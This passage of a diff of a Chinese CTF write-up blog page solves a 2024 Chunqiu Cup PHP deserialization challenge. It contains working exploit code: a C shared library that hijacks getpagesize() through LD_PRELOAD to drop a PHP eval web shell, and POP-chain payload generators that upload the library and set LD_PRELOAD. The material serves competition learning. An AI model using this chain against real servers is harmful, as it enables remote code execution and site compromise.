class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadDir</span>)) &#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$uploadDir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$value</span>[<span class="hljs-number">0</span>]));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$destination</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件成功移动到$&#123;destination&#125;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;文件移动失败。&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;非法文件名。&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FUN</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;fun-&gt;<span class="hljs-title function_ invoke__">getflag</span>(<span class="hljs-variable">$this</span>-&gt;value);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Harder&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
 
 <p>这道题的关键点是给了提示，是LD_PRELOAD，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63701832/article/details/129760495">https://blog.csdn.net/qq_63701832/article/details/129760495</a></p>
 <p>LD_PRELOAD允许你定义在程序运行前优先加载的动态链接库，那么我们便可以在自己定义的动态链接库中装入恶意函数.假设现在出现了一种这样的情况，一个文件中有一个恶意构造的函数和我们程序指令执行时调用的函数一模一样，而LD_PRELOAD路径指向这个文件后，这个文件的优先级高于原本函数的文件，那么优先调用我们的恶意文件后会覆盖原本的那个函数，最后当我们执行了一个指令后它会自动调用一次恶意的函数，这就会导致一些非预期的漏洞出现</p>
 <h4 id="核心思路："><a href="#核心思路：" class="headerlink" title="核心思路："></a>核心思路：</h4><p>我们看源码DIFF-&gt;__isset方法里使用了cat命令，我们如果可以修改cat命令里调用的函数，把他放到LD_PRELOAD里，这里ENV的putenv(“$key&#x3D;$value”);函数可以达成这个效果，正好FILE-&gt;call方法里有个文件上传点，我们把恶意函数封装成恶意so文件，上传上去，拿到文件路径。然后通过ENV类里的putenv函数把恶意so文件放到LD_PRELOAD里，那么在每次使用cat的时候，就会调用我们恶意so文件里封装的恶意函数，那么就可以达到RCE的效果。</p>
 <p>我们先看看cat命令调用了哪些函数：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace <span class="built_in">cat</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ltrace <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706140032088.png" alt="image-20240706140032088"></p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706140032088.png" srcset="/img/loading.gif" lazyload alt="image-20240706140032088"></p>
 <p>我们可以看到cat命令当中调用了很多函数，这里不列举，我们选择最简单的getpagesize() 函数进行污染竞争。</p>
 <p>写个C文件，函数名称是getpagesize，这是我们的恶意函数，然后使用gcc命令把它封装成一个so文件。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getpagesize</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27; &gt; /var/www/html/123.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getpagesize</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;echo &#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27; &gt; /var/www/html/123.php&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp.so -fPIC -shared -ldl -D_GNU_SOURCE</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc exp.c -o exp.so -fPIC -shared -ldl -D_GNU_SOURCE<br></code></pre></td></tr></table></figure>
 
 <p>现在我们得到so文件了，利用反序列化上传上去，pop链的构造这里不再赘述。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ENV</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$math</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DIFF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$back</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;1.so&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$enviroment</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FUN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ENV</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math = <span class="keyword">new</span> <span class="title function_ invoke__">DIFF</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback = <span class="keyword">new</span> <span class="title function_ invoke__">FUN</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback-&gt;fun = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback-&gt;value=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./exp.so&quot;</span>));</span><br><span class="line"><span class="comment">//由于题目里是base64解码后写入文件，我们这里也通过base64读入value里。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ENV</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$math</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DIFF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$callback</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$back</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FILE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;1.so&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$enviroment</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FUN</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ENV</span>();<br><span class="hljs-variable">$a</span>-&gt;math = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">DIFF</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">FUN</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback-&gt;fun = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">FILE</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback-&gt;value=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;./exp.so&quot;</span>));<br><span class="hljs-comment">//由于题目里是base64解码后写入文件，我们这里也通过base64读入value里。</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706140921515.png" alt="image-20240706140921515"></p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706140921515.png" srcset="/img/loading.gif" lazyload alt="image-20240706140921515"></p>
 <p>文件成功写入，我们记一下文件路径和名字&#x2F;tmp&#x2F;0df3a338b535b11d3ba93f518b697978.so</p>
 <p>然后经过ENV的putenv(“$key&#x3D;$value”);把他放到LD_PRELOAD里，这里pop链的构造同样不再赘述。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ENV</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&#x27;LD_PRELOAD&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>=<span class="string">&#x27;/tmp/0df3a338b535b11d3ba93f518b697978.so&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$math</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DIFF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$back</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$enviroment</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FUN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ENV</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math = <span class="keyword">new</span> <span class="title function_ invoke__">DIFF</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;math-&gt;callback-&gt;enviroment=<span class="keyword">new</span> <span class="title function_ invoke__">ENV</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ENV</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;LD_PRELOAD&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;/tmp/0df3a338b535b11d3ba93f518b697978.so&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$math</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DIFF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$callback</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$back</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br><br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FILE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$enviroment</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FUN</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ENV</span>();<br><span class="hljs-variable">$a</span>-&gt;math = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">DIFF</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">FILE</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback-&gt;enviroment=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ENV</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706141134699.png" alt="image-20240706141134699"></p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706141134699.png" srcset="/img/loading.gif" lazyload alt="image-20240706141134699"></p>
 <p>因为假flag都被调用了，那么cat肯定也被调用了，说明我们写的恶意函数已经被调用了。现在我们去123.php看看文件写进去没有。</p>
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706141249594.png" alt="image-20240706141249594"></p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706141249594.png" srcset="/img/loading.gif" lazyload alt="image-20240706141249594"></p>
 <p>拿到flag。</p>
 <p>flag{0b5339cb-69d0-42ad-bf61-2c02ac4b5b3a}</p>
-	
-		</div>
-		
-		<div id="current-post-cover" data-scr="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/2024%E6%98%A5%E7%A7%8B%E6%9D%AF.png"></div>
 
-		<!-- relate post, comment...-->
-		<div class="investment-container">
-			<div class="investment-header">
-				<div class="investment-title-1">
-					<div class="on">相关文章</div>
-					<div>评论</div>
-					<div>分享</div>
-				</div>
-				<div class="investment-title-2">	            
-					
-	<span>
-		<a id="totop-post-page">返回顶部</a>
-		
-			<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp" rel="prev">
-				&laquo;上一篇
-			</a>
-		
-		
-			<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp" rel="next">
-				下一篇&raquo;
-			</a>
-			
-	</span>
-
-
-      		
-				</div>	
-			</div>
-			
-			<div class="investment-content">
-				<div class="investment-content-list">
-					
-
-<div class="relate-post">
-	
-		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">
-								第八届西湖论剑初赛web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 18日, 2025				
-							</p>
-							<p class="relate-post-content">
-								Rank-l
-可能是ssti，过滤了一些东西，如果触发过滤，输入密码的页面会直接302
-过滤了空格，用request.args.aaa可以参数逃逸。
-1phone_number=&#123;&#123;url_for.__global...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/xhlj8/XHLJ8.png" alt="第八届西湖论剑初赛web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">
-								SUCTF 2025 WEB部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 14日, 2025				
-							</p>
-							<p class="relate-post-content">
-								SU_photogallery
-尝试源码泄露 https://www.cnblogs.com/Kawakaze777/p/17799235.html![e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b](img...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SUCTF2025/SUCTF2025.jpg" alt="SUCTF 2025 WEB部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">
-								2024鹏城杯web全wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十一月 9日, 2024				
-							</p>
-							<p class="relate-post-content">
-								python口算-pcb2024123456789101112131415161718192021222324import requestsimport reurl = &quot;http://192.168.18.28&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/5.jpg" alt="2024鹏城杯web全wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" title="强网杯2024">
-								强网杯2024			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十一月 3日, 2024				
-							</p>
-							<p class="relate-post-content">
-								PyBlockly黑名单过滤了所有符号，只能在print里用字母和数字，
-1234if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" title="强网杯2024">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/qwb2024/qwb2024.png" alt="强网杯2024"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">
-								SCTF2024 ezRender			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十月 7日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezRender这道题主要是成为admin，要成为admin就要伪造cookie，要伪造cookie就要获取jwt密钥。
-jwt密钥生成逻辑：
-123456789101112131415161718192021import timec...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SCTF2024/SCTF2024.jpg" alt="SCTF2024 ezRender"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">
-								ByteCTF2024大师赛web部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 21日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezobj源码：
-12345678910111213141516171819&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);include_once(&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024bytectf/bytectf.png" alt="ByteCTF2024大师赛web部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">
-								第四届长城杯web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 8日, 2024				
-							</p>
-							<p class="relate-post-content">
-								WEB
-SQLUS
-
-
-
-猜测账户是admin密码是任意一个字符
-登录进去后头像那边，可以上传文件，但是文件名里不能有p，尝试传入.htaccess然后传入一个txt当做php执行。
-
-
-
-在头像前端看到了上传路径
-
-
-flag没有权...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/第四届长城杯/ccb.png" alt="第四届长城杯web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">
-								NepCTF2024部分web			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								八月 25日, 2024				
-							</p>
-							<p class="relate-post-content">
-								NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里
-12if os.path.islink(new_file):    return &...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/nepctf2024/nepctf2024.png" alt="NepCTF2024部分web"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">
-								2024第七届巅峰极客部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								八月 25日, 2024				
-							</p>
-							<p class="relate-post-content">
-								GoldenHornKing源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：数字、百分号、非ascii之外的字符。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/dfjk/dfjk.png" alt="2024第七届巅峰极客部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
